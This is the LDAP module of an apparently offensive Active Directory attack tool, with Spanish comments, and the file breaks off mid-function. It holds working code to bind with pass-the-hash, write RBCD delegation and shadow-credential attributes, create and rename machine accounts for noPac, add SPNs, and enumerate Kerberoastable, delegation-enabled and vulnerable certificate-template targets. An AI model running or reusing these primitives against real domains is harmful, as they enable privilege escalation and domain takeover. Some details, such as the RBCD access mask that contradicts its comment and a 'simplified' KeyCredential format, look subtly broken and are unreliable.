# modules/ldap.py

"""
LDAPModule — capa de acceso LDAP/LDAPS sobre impacket.

Soporta:
  - Bind simple (usuario+contraseña)
  - Pass-the-hash (NTLM)
  - Null/anonymous session
  - LDAPS (puerto 636) y StartTLS

API pública requerida por los scripts existentes (PENDING-01):
  get_spn_accounts()
  get_unconstrained_delegation()
  get_constrained_delegation_targets(account)
  get_sid(account)
  write_rbcd(computer, attacker_sid)
  write_key_credential(user, pub_pem)
  set_own_upn(user, upn)
  create_machine_account(name, pwd)
  delete_machine_account(name)
  rename_samaccountname(old, new)
  add_spn(account, spn)
  remove_spn(account, spn)
  try_add_spn(account, spn)
  find_vulnerable_cert_templates()

API adicional para los scripts ldap/enum y ldap/attack:
  get_domain_info()
  get_all_users(attrs)
  get_all_groups()
  get_all_computers()
  get_password_policy()
  get_fine_grained_policies()
  get_admin_groups()
  get_domain_dacl(dn)
  get_object_dacl(dn)
  get_interesting_aces()
  get_asreproastable_users()
  get_bloodhound_data()
"""

import ssl
import struct
import socket
from datetime import datetime, timezone

from impacket.ldap import ldap as impacket_ldap
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldaptypes import (
    SR_SECURITY_DESCRIPTOR,
    ACCESS_ALLOWED_ACE,
    ACCESS_ALLOWED_OBJECT_ACE,
    ACCESS_DENIED_ACE,
    ACCESS_DENIED_OBJECT_ACE,
)

from core.output import print_result, print_check, print_table, console
from core import session_db

# ---------------------------------------------------------------------------
# Constantes LDAP / AD
# ---------------------------------------------------------------------------

# Atributos UAC relevantes
UAC_ACCOUNTDISABLE          = 0x00000002
UAC_PASSWD_NOTREQD          = 0x00000020
UAC_PASSWD_CANT_CHANGE      = 0x00000040
UAC_NORMAL_ACCOUNT          = 0x00000200
UAC_DONT_EXPIRE_PASSWD      = 0x00010000
UAC_SMARTCARD_REQUIRED      = 0x00040000
UAC_TRUSTED_FOR_DELEGATION  = 0x00080000   # unconstrained
UAC_NOT_DELEGATED           = 0x00100000
UAC_USE_DES_KEY_ONLY        = 0x00200000
UAC_DONT_REQ_PREAUTH        = 0x00400000   # ASREPRoastable
UAC_PASSWORD_EXPIRED        = 0x00800000
UAC_TRUSTED_TO_AUTH_FOR_DEL = 0x01000000   # constrained (Protocol Transition)
UAC_WORKSTATION_TRUST       = 0x00001000

# GUIDs de derechos extendidos (string, en minúsculas sin llaves)
RIGHT_DS_REPLICATION_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
RIGHT_CHANGE_PASSWORD                = "ab721a53-1e2f-11d0-9819-00aa0040529b"
RIGHT_RESET_PASSWORD                 = "00299570-246d-11d0-a768-00aa006e0529"
RIGHT_WRITE_MEMBER                   = "bf9679c0-0de6-11d0-a285-00aa003049e2"

# GUIDs de propiedades / property-sets (para WriteProp)
PROP_SET_USER_ACCOUNT = "4c164200-20c0-11d0-a768-00aa006e0529"

# Access mask bits de interés
ADS_RIGHT_GENERIC_ALL        = 0x10000000
ADS_RIGHT_GENERIC_WRITE      = 0x40000000
ADS_RIGHT_WRITE_DACL         = 0x00040000
ADS_RIGHT_WRITE_OWNER        = 0x00080000
ADS_RIGHT_DS_WRITE_PROP      = 0x00000020
ADS_RIGHT_DS_CONTROL_ACCESS  = 0x00000100

INTERESTING_MASK = (
    ADS_RIGHT_GENERIC_ALL |
    ADS_RIGHT_GENERIC_WRITE |
    ADS_RIGHT_WRITE_DACL |
    ADS_RIGHT_WRITE_OWNER |
    ADS_RIGHT_DS_WRITE_PROP |
    ADS_RIGHT_DS_CONTROL_ACCESS
)

# Grupos privilegiados por su RID fijo
PRIVILEGED_RIDS = {
    512: "Domain Admins",
    518: "Schema Admins",
    519: "Enterprise Admins",
    544: "Administrators",
    548: "Account Operators",
    549: "Server Operators",
    550: "Print Operators",
    551: "Backup Operators",
}

# Plantillas de certificado — flags vulnerables
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT  = 0x00000001  # ESC1
CT_FLAG_NO_SECURITY_EXTENSION      = 0x00080000  # ESC9


# ---------------------------------------------------------------------------
# Helpers internos
# ---------------------------------------------------------------------------

def _filetime_to_dt(filetime_int):
    """Convierte FILETIME de Windows (100ns desde 1601-01-01) a datetime UTC."""
    if not filetime_int or filetime_int in (0, 9223372036854775807):
        return None
    try:
        ts = (int(filetime_int) - 116444736000000000) / 10_000_000
        return datetime.fromtimestamp(ts, tz=timezone.utc)
    except (ValueError, OSError):
        return None


def _filetime_str(filetime_int):
    dt = _filetime_to_dt(filetime_int)
    return dt.strftime("%Y-%m-%d %H:%M:%S UTC") if dt else "never"


def _uac_flags(uac):
    """Devuelve lista de flags UAC activos como strings legibles."""
    flags = []
    mapping = [
        (UAC_ACCOUNTDISABLE,         "DISABLED"),
        (UAC_PASSWD_NOTREQD,         "NO_PWD_REQUIRED"),
        (UAC_DONT_EXPIRE_PASSWD,     "PWD_NEVER_EXPIRES"),
        (UAC_DONT_REQ_PREAUTH,       "NO_PREAUTH"),          # ASREPRoastable
        (UAC_TRUSTED_FOR_DELEGATION, "UNCONSTRAINED_DELEG"),
        (UAC_TRUSTED_TO_AUTH_FOR_DEL,"CONSTRAINED_DELEG"),
        (UAC_SMARTCARD_REQUIRED,     "SMARTCARD_REQUIRED"),
        (UAC_USE_DES_KEY_ONLY,       "DES_ONLY"),
        (UAC_PASSWORD_EXPIRED,       "PWD_EXPIRED"),
        (UAC_WORKSTATION_TRUST,      "MACHINE_ACCOUNT"),
    ]
    for mask, name in mapping:
        if uac & mask:
            flags.append(name)
    return flags


def _sid_to_str(sid_bytes):
    """Convierte un SID binario (bytes) a su representación string S-1-..."""
    if not sid_bytes:
        return ""
    try:
        revision    = sid_bytes[0]
        sub_count   = sid_bytes[1]
        authority   = int.from_bytes(sid_bytes[2:8], "big")
        subs = []
        for i in range(sub_count):
            offset = 8 + i * 4
            subs.append(struct.unpack_from("<I", sid_bytes, offset)[0])
        return "S-{}-{}-{}".format(revision, authority, "-".join(str(s) for s in subs))
    except Exception:
        return ""


def _rid_from_sid(sid_str):
    """Extrae el RID (último sub-authority) de un SID string."""
    try:
        return int(sid_str.rsplit("-", 1)[-1])
    except (ValueError, IndexError):
        return None


def _attr(entry, name, default=None):
    """Extrae el primer valor de un atributo de una entrada LDAP de impacket."""
    try:
        for attr in entry["attributes"]:
            if str(attr["type"]) == name:
                vals = attr["vals"]
                if vals:
                    return str(vals[0])
    except Exception:
        pass
    return default


def _attr_all(entry, name):
    """Extrae todos los valores de un atributo multivaluado."""
    results = []
    try:
        for attr in entry["attributes"]:
            if str(attr["type"]) == name:
                for v in attr["vals"]:
                    results.append(str(v))
    except Exception:
        pass
    return results


def _attr_bytes(entry, name):
    """Extrae el primer valor como bytes (para SID, nTSecurityDescriptor...)."""
    try:
        for attr in entry["attributes"]:
            if str(attr["type"]) == name:
                vals = attr["vals"]
                if vals:
                    return bytes(vals[0])
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# LDAPModule
# ---------------------------------------------------------------------------

class LDAPModule:
    """
    Módulo LDAP de Lobera.

    Uso básico:
        ldap = LDAPModule(target, creds)
        if ldap.connect():
            users = ldap.get_all_users()
    """

    def __init__(self, target, creds, use_ssl=False, port=None):
        self.target   = target          # Target(ip, hostname, domain, timeout)
        self.creds    = creds           # Creds(user, password, domain, hash)
        self.use_ssl  = use_ssl
        self.port     = port or (636 if use_ssl else 389)
        self._conn    = None
        self._base_dn = None           # se calcula en connect()
        self._domain  = None           # dominio canonicalizado

    # ------------------------------------------------------------------
    # Conexión y bind
    # ------------------------------------------------------------------

    def connect(self):
        """
        Abre la conexión TCP al DC y realiza el bind LDAP.
        Soporta: password, pass-the-hash (NTLM), null/anonymous.
        Retorna True si tiene éxito, False en caso contrario.
        """
        try:
            # Resolver hostname: preferimos FQDN del dominio si existe
            target_host = self.target.hostname or self.target.ip
            domain      = self.creds.domain or self.target.domain or ""
            self._domain = domain

            if self.use_ssl:
                tls = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                tls.check_hostname = False
                tls.verify_mode    = ssl.CERT_NONE
                conn = impacket_ldap.LDAPConnection(
                    "ldaps://{}".format(target_host),
                    self._build_base_dn(domain),
                    target_host,
                )
            else:
                conn = impacket_ldap.LDAPConnection(
                    "ldap://{}".format(target_host),
                    self._build_base_dn(domain),
                    target_host,
                )

            # Bind
            if self.creds.is_null_session():
                conn.login("", "", "", "", "")
                print_result("LDAP", self.target.ip, "ok", "anonymous bind")
            elif self.creds.hash:
                lm_hash, nt_hash = self._split_hash(self.creds.hash)
                conn.login(
                    self.creds.user, "", domain, lm_hash, nt_hash
                )
                print_result("LDAP", self.target.ip, "pwned",
                             "bind NTLM (pass-the-hash) como {}".format(self.creds.user))
            else:
                conn.login(
                    self.creds.user, self.creds.password, domain, "", ""
                )
                print_result("LDAP", self.target.ip, "pwned",
                             "bind como {}".format(self.creds.user))

            self._conn    = conn
            self._base_dn = self._build_base_dn(domain)
            session_db.save_target(self.target.ip, hostname=self.target.hostname,
                                   domain=domain)
            return True

        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "no se pudo conectar: {}".format(exc))
            return False

    def disconnect(self):
        if self._conn:
            try:
                self._conn.close()
            except Exception:
                pass
            self._conn = None

    def _build_base_dn(self, domain):
        if not domain:
            return ""
        return ",".join("DC={}".format(part) for part in domain.split("."))

    def _split_hash(self, hash_str):
        """Separa LM:NT o devuelve vacío:NT si solo se da NT."""
        if ":" in hash_str:
            lm, nt = hash_str.split(":", 1)
            return lm, nt
        return "aad3b435b51404eeaad3b435b51404ee", hash_str

    def _search(self, search_filter, attributes, base_dn=None, scope=None):
        """
        Wrapper de búsqueda LDAP. Devuelve lista de entradas.
        Maneja paginación automática con impacket.
        """
        if not self._conn:
            return []
        base = base_dn or self._base_dn
        try:
            resp = self._conn.search(
                searchBase=base,
                searchFilter=search_filter,
                attributes=attributes,
                sizeLimit=0,
            )
            entries = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry):
                    entries.append(item)
            return entries
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "búsqueda fallida ({}): {}".format(search_filter[:60], exc))
            return []

    def _modify(self, dn, changes):
        """
        Wrapper de modificación LDAP.
        changes: lista de (attribute_name, operation, values)
          operation: 'add' | 'replace' | 'delete'
        Retorna True si tiene éxito.
        """
        if not self._conn:
            return False
        try:
            mod_list = []
            for attr, op, vals in changes:
                op_code = {
                    "add":     ldapasn1_impacket.ModifyRequest.OPERATION_ADD,
                    "replace": ldapasn1_impacket.ModifyRequest.OPERATION_REPLACE,
                    "delete":  ldapasn1_impacket.ModifyRequest.OPERATION_DELETE,
                }.get(op, ldapasn1_impacket.ModifyRequest.OPERATION_REPLACE)
                mod_list.append(
                    ldapasn1_impacket.ModifyRequest.build(attr, op_code, vals)
                )
            self._conn.modify(dn, mod_list)
            return True
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "modify fallido en {}: {}".format(dn, exc))
            return False

    def _add(self, dn, attributes):
        """Wrapper de addRequest LDAP."""
        if not self._conn:
            return False
        try:
            self._conn.add(dn, attributes=attributes)
            return True
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "add fallido en {}: {}".format(dn, exc))
            return False

    def _delete(self, dn):
        """Wrapper de deleteRequest LDAP."""
        if not self._conn:
            return False
        try:
            self._conn.delete(dn)
            return True
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "delete fallido en {}: {}".format(dn, exc))
            return False

    # ------------------------------------------------------------------
    # Helpers de construcción de DN
    # ------------------------------------------------------------------

    def _user_dn(self, username):
        """Busca el DN de un usuario por sAMAccountName."""
        entries = self._search(
            "(sAMAccountName={})".format(username),
            ["distinguishedName"],
        )
        if entries:
            return _attr(entries[0], "distinguishedName")
        return "CN={},CN=Users,{}".format(username, self._base_dn)

    def _computer_dn(self, name):
        """Busca el DN de un equipo por sAMAccountName (con $ al final)."""
        sam = name if name.endswith("$") else name + "$"
        entries = self._search(
            "(sAMAccountName={})".format(sam),
            ["distinguishedName"],
        )
        if entries:
            return _attr(entries[0], "distinguishedName")
        return "CN={},CN=Computers,{}".format(name, self._base_dn)

    # ==================================================================
    # API PÚBLICA — requerida por scripts existentes (PENDING-01)
    # ==================================================================

    def get_spn_accounts(self):
        """
        Devuelve lista de dicts con cuentas que tienen SPN registrado.
        Usado por kerberos/enum/spn-scan y kerberos/extraction/kerberoasting.

        Cada dict: {user, spns, dn, sid}
        """
        entries = self._search(
            "(&(objectClass=user)(servicePrincipalName=*)"
            "(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
            ["sAMAccountName", "servicePrincipalName", "distinguishedName",
             "objectSid", "userAccountControl", "memberOf"],
        )
        results = []
        for e in entries:
            user = _attr(e, "sAMAccountName", "")
            spns = _attr_all(e, "servicePrincipalName")
            dn   = _attr(e, "distinguishedName", "")
            sid  = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            results.append({"user": user, "spns": spns, "dn": dn, "sid": sid})
            session_db.save_finding(
                self.target.ip, "LDAP", "spn_account",
                "{} -> {}".format(user, ", ".join(spns)),
            )
        return results

    def get_unconstrained_delegation(self):
        """
        Devuelve cuentas con delegación sin restricción (TrustedForDelegation).
        Usado por kerberos/delegation/unconstrained-deleg.

        Cada dict: {name, dn, is_computer, sid}
        """
        # UAC bit 0x80000 = TRUSTED_FOR_DELEGATION
        entries = self._search(
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            ["sAMAccountName", "distinguishedName", "objectSid",
             "userAccountControl", "dNSHostName"],
        )
        results = []
        for e in entries:
            name       = _attr(e, "sAMAccountName", "")
            dn         = _attr(e, "distinguishedName", "")
            sid        = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            uac        = int(_attr(e, "userAccountControl", "0"))
            is_machine = bool(uac & UAC_WORKSTATION_TRUST)
            if name.upper() in ("KRBTGT", "KRBTGT$"):
                continue  # krbtgt siempre tiene este flag, no es hallazgo
            results.append({
                "name": name, "dn": dn,
                "is_computer": is_machine, "sid": sid,
            })
            session_db.save_finding(
                self.target.ip, "LDAP", "unconstrained_delegation",
                "{} ({})".format(name, "máquina" if is_machine else "usuario"),
            )
        return results

    def get_constrained_delegation_targets(self, account):
        """
        Devuelve lista de SPNs a los que 'account' puede delegar
        (msDS-AllowedToDelegateTo).
        """
        entries = self._search(
            "(sAMAccountName={})".format(account),
            ["msDS-AllowedToDelegateTo", "distinguishedName"],
        )
        if not entries:
            return []
        return _attr_all(entries[0], "msDS-AllowedToDelegateTo")

    def get_sid(self, account):
        """
        Retorna el SID en formato string de una cuenta (usuario o equipo).
        Busca por sAMAccountName.
        """
        entries = self._search(
            "(sAMAccountName={})".format(account),
            ["objectSid"],
        )
        if not entries:
            return ""
        sid_bytes = _attr_bytes(entries[0], "objectSid")
        return _sid_to_str(sid_bytes or b"")

    def write_rbcd(self, computer, attacker_sid):
        """
        Escribe msDS-AllowedToActOnBehalfOfOtherIdentity en 'computer'
        para habilitar RBCD desde 'attacker_sid'.

        computer: sAMAccountName del equipo víctima (con o sin $)
        attacker_sid: SID string del atacante (cuenta de máquina)
        Retorna True si tiene éxito.
        """
        # Construir Security Descriptor con DACL que permite el SID
        # Formato binario mínimo: self-relative SD con una ACE Allow
        try:
            sid_bytes = self._sid_str_to_bytes(attacker_sid)
            # ACE: ACCESS_ALLOWED_ACE, mask 0xF01FF (GENERIC_ALL para Kerberos)
            ace_mask = 0x00000900  # ADS_RIGHT_DS_CONTROL_ACCESS | ADS_RIGHT_DS_READ_PROP
            ace = self._build_allowed_ace(ace_mask, sid_bytes)
            dacl = self._build_dacl([ace])
            sd   = self._build_sd(dacl)

            dn = self._computer_dn(computer)
            ok = self._modify(dn, [
                ("msDS-AllowedToActOnBehalfOfOtherIdentity", "replace", [sd]),
            ])
            if ok:
                print_result("LDAP", self.target.ip, "pwned",
                             "RBCD escrito en {} para {}".format(computer, attacker_sid))
                session_db.save_finding(
                    self.target.ip, "LDAP", "rbcd_written",
                    "{} -> {}".format(attacker_sid, computer),
                )
            return ok
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "error escribiendo RBCD: {}".format(exc))
            return False

    def write_key_credential(self, user, pub_pem):
        """
        Escribe msDS-KeyCredentialLink para shadow credentials.
        pub_pem: clave pública RSA en formato PEM (str).
        Retorna el key_id (str) si tiene éxito, None en caso contrario.
        """
        try:
            from Cryptodome.PublicKey import RSA
            from Cryptodome.Hash import SHA256
            import base64
            import os as _os

            key    = RSA.import_key(pub_pem)
            pub_der = key.export_key("DER")

            # KeyCredential v2: estructura propietaria de MS
            # Formato: version(4) + KeyID(32) + raw_key_len(4) + raw_key + usage(1) + ...
            key_id_bytes = _os.urandom(32)
            key_id_str   = key_id_bytes.hex()

            # Empaquetado simplificado compatible con certipy / PKINITtools
            key_blob  = struct.pack("<I", 2)                # Version = 2
            key_blob += struct.pack("<H", len(key_id_bytes)) + key_id_bytes
            key_blob += struct.pack("<H", len(pub_der))     + pub_der
            key_blob += b"\x01"                             # Usage = 1 (KEY_USAGE_NGC)

            dn = self._user_dn(user)
            value = base64.b64encode(key_blob).decode()
            ok = self._modify(dn, [
                ("msDS-KeyCredentialLink", "add", [value]),
            ])
            if ok:
                print_result("LDAP", self.target.ip, "pwned",
                             "KeyCredentialLink escrito para {}".format(user))
                session_db.save_finding(
                    self.target.ip, "LDAP", "shadow_credentials",
                    "user={} key_id={}".format(user, key_id_str),
                )
                return key_id_str
            return None
        except Exception as exc:
            print_result("LDAP", self.target.ip, "fail",
                         "error escribiendo KeyCredentialLink: {}".format(exc))
            return None

    def set_own_upn(self, user, upn):
        """
        Escribe userPrincipalName en el objeto 'user'.
        Usado por reset-nightmare para identity confusion.
        Retorna True si tiene éxito.
        """
        dn = self._user_dn(user)
        ok = self._modify(dn, [("userPrincipalName", "replace", [upn])])
        if ok:
            print_result("LDAP", self.target.ip, "ok",
                         "UPN de {} cambiado a {}".format(user, upn))
        return ok

    def create_machine_account(self, name, pwd):
        """
        Crea una cuenta de máquina en CN=Computers.
        Retorna True si tiene éxito.
        """
        sam = name if name.endswith("$") else name + "$"
        dn  = "CN={},CN=Computers,{}".format(name.rstrip("$"), self._base_dn)
        attrs = {
            "objectClass":        ["top", "person", "organizationalPerson",
                                   "user", "computer"],
            "sAMAccountName":     [sam],
            "userAccountControl": ["4096"],   # WORKSTATION_TRUST_ACCOUNT
            "unicodePwd":         [('"{}"'.format(pwd)).encode("utf-16-le")],
        }
        ok = self._add(dn, attrs)
        if ok:
            print_result("LDAP", self.target.ip, "pwned",
                         "cuenta de máquina {} creada".format(sam))
            session_db.save_finding(
                self.target.ip, "LDAP", "machine_account_created", sam,
            )
        return ok

    def delete_machine_account(self, name):
        """Borra la cuenta de máquina 'name'."""
        dn = self._computer_dn(name)
        ok = self._delete(dn)
        if ok:
            print_result("LDAP", self.target.ip, "ok",
                         "cuenta de máquina {} borrada".format(name))
        return ok

    def rename_samaccountname(self, old, new):
        """
        Cambia sAMAccountName de 'old' a 'new'.
        Usado en noPac (sam-spoofing) para renombrar cuenta de máquina al nombre del DC.
        """
        dn = self._user_dn(old) or self._computer_dn(old)
        ok = self._modify(dn, [("sAMAccountName", "replace", [new])])
        if ok:
            print_result("LDAP", self.target.ip, "ok",
                         "sAMAccountName {} → {}".format(old, new))
        return ok

    def add_spn(self, account, spn):
        """Añade un SPN a la cuenta indicada."""
        dn = self._user_dn(account)
        ok = self._modify(dn, [("servicePrincipalName", "add", [spn])])
        if ok:
            print_result("LDAP", self.target.ip, "ok",
                         "SPN {} añadido a {}".format(spn, account))
        return ok

    def remove_spn(self, account, spn):
        """Elimina un SPN de la cuenta indicada."""
        dn = self._user_dn(account)
        ok = self._modify(dn, [("servicePrincipalName", "delete", [spn])])
        if ok:
            print_result("LDAP", self.target.ip, "ok",
                         "SPN {} eliminado de {}".format(spn, account))
        return ok

    def try_add_spn(self, account, spn):
        """Intenta añadir SPN; retorna True/False sin lanzar excepción."""
        try:
            return self.add_spn(account, spn)
        except Exception:
            return False

    def find_vulnerable_cert_templates(self):
        """
        Busca plantillas de certificado vulnerables (ESC1, ESC3...) en AD CS.
        Requiere que el DC tenga AD CS instalado (CN=Public Key Services).

        Retorna lista de dicts: {name, dn, flags, enrollment_rights, esc1, esc3}
        """
        pki_base = "CN=Certificate Templates,CN=Public Key Services," \
                   "CN=Services,CN=Configuration,{}".format(self._base_dn)
        entries = self._search(
            "(objectClass=pKICertificateTemplate)",
            ["cn", "distinguishedName", "msPKI-Certificate-Name-Flag",
             "msPKI-Enrollment-Flag", "nTSecurityDescriptor",
             "pKIExtendedKeyUsage", "msPKI-RA-Signature"],
            base_dn=pki_base,
        )
        results = []
        for e in entries:
            name      = _attr(e, "cn", "")
            dn        = _attr(e, "distinguishedName", "")
            name_flag = int(_attr(e, "msPKI-Certificate-Name-Flag", "0"))
            enroll_f  = int(_attr(e, "msPKI-Enrollment-Flag", "0"))
            ra_sig    = int(_attr(e, "msPKI-RA-Signature", "0"))
            ekus      = _attr_all(e, "pKIExtendedKeyUsage")

            esc1 = bool(name_flag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
            esc3 = (ra_sig == 0 and
                    "1.3.6.1.4.1.311.20.2.1" in ekus)  # Certificate Request Agent EKU

            if esc1 or esc3:
                tag = "ESC1" if esc1 else "ESC3"
                results.append({
                    "name": name, "dn": dn,
                    "name_flag": name_flag, "enroll_flag": enroll_f,
                    "esc1": esc1, "esc3": esc3, "ekus": ekus,
                })
                session_db.save_finding(
                    self.target.ip, "LDAP", "vuln_cert_template",
                    "{}: {}".format(tag, name),
                )
        return results

    # ==================================================================
    # API PÚBLICA — enumeración general (usada por scripts ldap/enum/)
    # ==================================================================

    def get_domain_info(self):
        """
        Información básica del dominio: nombre, SID, nivel funcional,
        DCs, política de contraseñas por defecto.

        Retorna dict con claves:
          domain, dn, sid, functional_level, dc_list,
          min_pwd_length, lockout_threshold, lockout_duration,
          pwd_history_length, max_pwd_age
        """
        # Atributos del objeto raíz del dominio
        entries = self._search(
            "(objectClass=domain)",
            ["distinguishedName", "objectSid", "ms-DS-MachineAccountQuota",
             "minPwdLength", "lockoutThreshold", "lockoutDuration",
             "pwdHistoryLength", "maxPwdAge", "minPwdAge",
             "msDS-Behavior-Version", "name"],
            base_dn=self._base_dn,
        )

        info = {
            "domain": self._domain,
            "dn": self._base_dn,
            "sid": "",
            "functional_level": "Desconocido",
            "dc_list": [],
            "min_pwd_length": 0,
            "lockout_threshold": 0,
            "lockout_duration": 0,
            "pwd_history_length": 0,
            "max_pwd_age": 0,
            "machine_account_quota": 10,
        }

        if entries:
            e = entries[0]
            info["sid"]                = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            info["min_pwd_length"]     = int(_attr(e, "minPwdLength", "0"))
            info["lockout_threshold"]  = int(_attr(e, "lockoutThreshold", "0"))
            info["pwd_history_length"] = int(_attr(e, "pwdHistoryLength", "0"))
            info["machine_account_quota"] = int(
                _attr(e, "ms-DS-MachineAccountQuota", "10"))

            # Nivel funcional (msDS-Behavior-Version)
            bv = int(_attr(e, "msDS-Behavior-Version", "-1"))
            fl_map = {0: "2000", 1: "2003 Interim", 2: "2003",
                      3: "2008", 4: "2008 R2", 5: "2012", 6: "2012 R2", 7: "2016+"}
            info["functional_level"] = "Windows Server " + fl_map.get(bv, str(bv))

            # lockoutDuration en 100ns negativos → minutos
            ld_raw = _attr(e, "lockoutDuration", "0")
            try:
                ld_int = abs(int(ld_raw)) // 600_000_000
                info["lockout_duration"] = ld_int
            except ValueError:
                pass

            # maxPwdAge en 100ns negativos → días
            mp_raw = _attr(e, "maxPwdAge", "0")
            try:
                mp_int = abs(int(mp_raw)) // 864_000_000_000
                info["max_pwd_age"] = mp_int
            except ValueError:
                pass

        # DCs del dominio
        dc_entries = self._search(
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            ["dNSHostName", "operatingSystem", "operatingSystemVersion"],
        )
        for dc in dc_entries:
            info["dc_list"].append({
                "dns":    _attr(dc, "dNSHostName", ""),
                "os":     _attr(dc, "operatingSystem", ""),
                "os_ver": _attr(dc, "operatingSystemVersion", ""),
            })

        session_db.save_finding(
            self.target.ip, "LDAP", "domain_info",
            "domain={} sid={} level={}".format(
                info["domain"], info["sid"], info["functional_level"]),
        )
        return info

    def get_all_users(self, attrs=None):
        """
        Lista todos los usuarios del dominio.

        Retorna lista de dicts con claves:
          user, dn, sid, uac, uac_flags, enabled, no_preauth,
          pwd_last_set, last_logon, bad_pwd_count, spns, member_of
        """
        default_attrs = [
            "sAMAccountName", "distinguishedName", "objectSid",
            "userAccountControl", "pwdLastSet", "lastLogon",
            "badPwdCount", "servicePrincipalName", "memberOf",
            "description", "adminCount",
        ]
        entries = self._search(
            "(&(objectClass=user)(!(objectClass=computer)))",
            attrs or default_attrs,
        )
        results = []
        for e in entries:
            uac     = int(_attr(e, "userAccountControl", "0"))
            flags   = _uac_flags(uac)
            user    = _attr(e, "sAMAccountName", "")
            sid     = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            results.append({
                "user":          user,
                "dn":            _attr(e, "distinguishedName", ""),
                "sid":           sid,
                "uac":           uac,
                "uac_flags":     flags,
                "enabled":       not bool(uac & UAC_ACCOUNTDISABLE),
                "no_preauth":    bool(uac & UAC_DONT_REQ_PREAUTH),
                "pwd_last_set":  _filetime_str(_attr(e, "pwdLastSet", "0")),
                "last_logon":    _filetime_str(_attr(e, "lastLogon", "0")),
                "bad_pwd_count": int(_attr(e, "badPwdCount", "0")),
                "spns":          _attr_all(e, "servicePrincipalName"),
                "member_of":     _attr_all(e, "memberOf"),
                "description":   _attr(e, "description", ""),
                "admin_count":   int(_attr(e, "adminCount", "0")),
            })
        return results

    def get_all_groups(self):
        """
        Lista todos los grupos del dominio con sus miembros.

        Retorna lista de dicts: {name, dn, sid, member_count, members, rid}
        """
        entries = self._search(
            "(objectClass=group)",
            ["sAMAccountName", "distinguishedName", "objectSid",
             "member", "description", "adminCount"],
        )
        results = []
        for e in entries:
            sid     = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            rid     = _rid_from_sid(sid)
            members = _attr_all(e, "member")
            results.append({
                "name":         _attr(e, "sAMAccountName", ""),
                "dn":           _attr(e, "distinguishedName", ""),
                "sid":          sid,
                "rid":          rid,
                "member_count": len(members),
                "members":      members,
                "description":  _attr(e, "description", ""),
                "admin_count":  int(_attr(e, "adminCount", "0")),
            })
        return results

    def get_all_computers(self):
        """
        Lista todos los equipos del dominio.

        Retorna lista de dicts:
          {name, dns, dn, sid, os, os_version, last_logon, enabled,
           unconstrained_deleg, spns}
        """
        entries = self._search(
            "(objectClass=computer)",
            ["sAMAccountName", "dNSHostName", "distinguishedName",
             "objectSid", "operatingSystem", "operatingSystemVersion",
             "lastLogon", "userAccountControl", "servicePrincipalName"],
        )
        results = []
        for e in entries:
            uac = int(_attr(e, "userAccountControl", "0"))
            sid = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            results.append({
                "name":               _attr(e, "sAMAccountName", ""),
                "dns":                _attr(e, "dNSHostName", ""),
                "dn":                 _attr(e, "distinguishedName", ""),
                "sid":                sid,
                "os":                 _attr(e, "operatingSystem", ""),
                "os_version":         _attr(e, "operatingSystemVersion", ""),
                "last_logon":         _filetime_str(_attr(e, "lastLogon", "0")),
                "enabled":            not bool(uac & UAC_ACCOUNTDISABLE),
                "unconstrained_deleg":bool(uac & UAC_TRUSTED_FOR_DELEGATION),
                "spns":               _attr_all(e, "servicePrincipalName"),
            })
        return results

    def get_password_policy(self):
        """
        Retorna la política de contraseñas por defecto del dominio.
        Ver también get_fine_grained_policies() para PSOs.
        """
        entries = self._search(
            "(objectClass=domain)",
            ["minPwdLength", "lockoutThreshold", "lockoutDuration",
             "pwdHistoryLength", "maxPwdAge", "minPwdAge",
             "lockoutObservationWindow", "pwdProperties"],
        )
        if not entries:
            return {}
        e = entries[0]

        def _100ns_to_minutes(val):
            try:
                return abs(int(val)) // 600_000_000
            except (ValueError, TypeError):
                return 0

        def _100ns_to_days(val):
            try:
                return abs(int(val)) // 864_000_000_000
            except (ValueError, TypeError):
                return 0

        policy = {
            "min_pwd_length":         int(_attr(e, "minPwdLength", "0")),
            "pwd_history_length":     int(_attr(e, "pwdHistoryLength", "0")),
            "lockout_threshold":      int(_attr(e, "lockoutThreshold", "0")),
            "lockout_duration_min":   _100ns_to_minutes(_attr(e, "lockoutDuration", "0")),
            "lockout_window_min":     _100ns_to_minutes(_attr(e, "lockoutObservationWindow", "0")),
            "max_pwd_age_days":       _100ns_to_days(_attr(e, "maxPwdAge", "0")),
            "min_pwd_age_days":       _100ns_to_days(_attr(e, "minPwdAge", "0")),
            "complexity_enabled":     bool(int(_attr(e, "pwdProperties", "0")) & 1),
        }
        session_db.save_finding(
            self.target.ip, "LDAP", "password_policy",
            "min_len={} lockout={} complexity={}".format(
                policy["min_pwd_length"],
                policy["lockout_threshold"],
                policy["complexity_enabled"],
            ),
        )
        return policy

    def get_fine_grained_policies(self):
        """
        Lista las Fine-Grained Password Policies (PSOs).
        Solo visibles si tienes permisos de lectura en CN=Password Settings Container.
        """
        pso_base = "CN=Password Settings Container,CN=System,{}".format(self._base_dn)
        entries = self._search(
            "(objectClass=msDS-PasswordSettings)",
            ["cn", "msDS-MinimumPasswordLength", "msDS-LockoutThreshold",
             "msDS-PasswordSettingsPrecedence", "msDS-AppliesTo",
             "msDS-LockoutDuration", "msDS-MaximumPasswordAge",
             "msDS-PasswordComplexityEnabled"],
            base_dn=pso_base,
        )
        results = []
        for e in entries:
            results.append({
